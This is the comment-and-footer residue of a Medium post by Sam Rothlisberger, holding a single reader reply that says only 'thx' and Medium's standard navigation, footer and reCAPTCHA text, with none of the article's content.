[![Joseph "n3m0” KANKO](https://miro.medium.com/v2/resize:fill:32:32/1*m1fYMNmaiHN9OwQuHaDzlw.png)](https://medium.com/@kankojoseph?source=post_page---post_responses--bb589148e56f----0-----------------------------------)

[Joseph "n3m0” KANKO](https://medium.com/@kankojoseph?source=post_page---post_responses--bb589148e56f----0-----------------------------------)

[Aug 20, 2025](https://medium.com/@kankojoseph/thx-78f255299e61?source=post_page---post_responses--bb589148e56f----0-----------------------------------)

```
thx
```

--

Reply

## More from Sam Rothlisberger

[See all from Sam Rothlisberger](https://medium.com/@sam.rothlisberger?source=post_page---author_recirc--bb589148e56f---------------------------------------)

## Recommended from Medium

[See more recommendations](https://medium.com/?source=post_page---read_next_recirc--bb589148e56f---------------------------------------)

[Help](https://help.medium.com/hc/en-us?source=post_page-----bb589148e56f---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----bb589148e56f---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----bb589148e56f---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----bb589148e56f---------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----bb589148e56f---------------------------------------)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----bb589148e56f---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----bb589148e56f---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----bb589148e56f---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----bb589148e56f---------------------------------------)

reCAPTCHA

Recaptcha requires verification.

[Privacy](https://www.google.com/intl/en/policies/privacy/) \- [Terms](https://www.google.com/intl/en/policies/terms/)

protected by **reCAPTCHA**

[Privacy](https://www.google.com/intl/en/policies/privacy/) \- [Terms](https://www.google.com/intl/en/policies/terms/)